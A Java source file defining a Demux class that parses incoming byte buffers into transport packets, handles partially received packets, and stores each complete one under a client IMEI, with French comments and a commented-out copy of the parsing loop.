package com.android.security.in;

 
import java.nio.ByteBuffer;

import com.android.security.inout.Controler;
import com.android.security.inout.Protocol;
import com.android.security.packages.TransportPacket;

public class Demux {
	// acces au controler
	private Controler controler;

	// un packet
	private TransportPacket p;


	// l'identifiant du client
	private String imei;

	// le buffer de lecture
	private ByteBuffer buffer;

	// variables de controle
	private boolean partialDataExpected, reading;

	public Demux(Controler s, String i) {
		imei = i;
		controler = s;
    	reading = true;
		partialDataExpected = false;

	}

	public boolean receive(ByteBuffer buffer) throws Exception
	{

	/*	while (reading) {
			
	
				if(!partialDataExpected)
					//si on n'attend pas de donn�es partielles(dans le cas d'un paquet pas re�ue enti�rement)
				{	
						// si la taille du buffer est insuffisante
						if ((buffer.limit() - buffer.position()) < Protocol.HEADER_LENGTH_DATA) 
						{
							
							return true;
						}
				}
	
				// dans le cas d'un paquet partiellement recue
				if (partialDataExpected)
					partialDataExpected = p.parseCompleter(buffer);
				else 
				{
					p = new TransportPacket();
					partialDataExpected = p.parse(buffer);
				}
				
				
				
				if (partialDataExpected)
					return true;
				else
					controler.Storage(p, imei);
			
		}


		reading = true;*/
		
		while (this.reading) {
			if (!this.partialDataExpected) {
				if (buffer.limit() - buffer.position() <Protocol.HEADER_LENGTH_DATA) {
					return true;
				}
			}

			if (this.partialDataExpected) {
				this.partialDataExpected = this.p.parseCompleter(buffer);
			} else {
				this.p = new TransportPacket();
				this.partialDataExpected = this.p.parse(buffer);
			}

			if (this.partialDataExpected) {
				return true;
			}
			this.controler.Storage(p, imei);
		}
		this.reading = true;

		return true;
	}

	public void setImei(String i) {
		imei = i;
	}

}
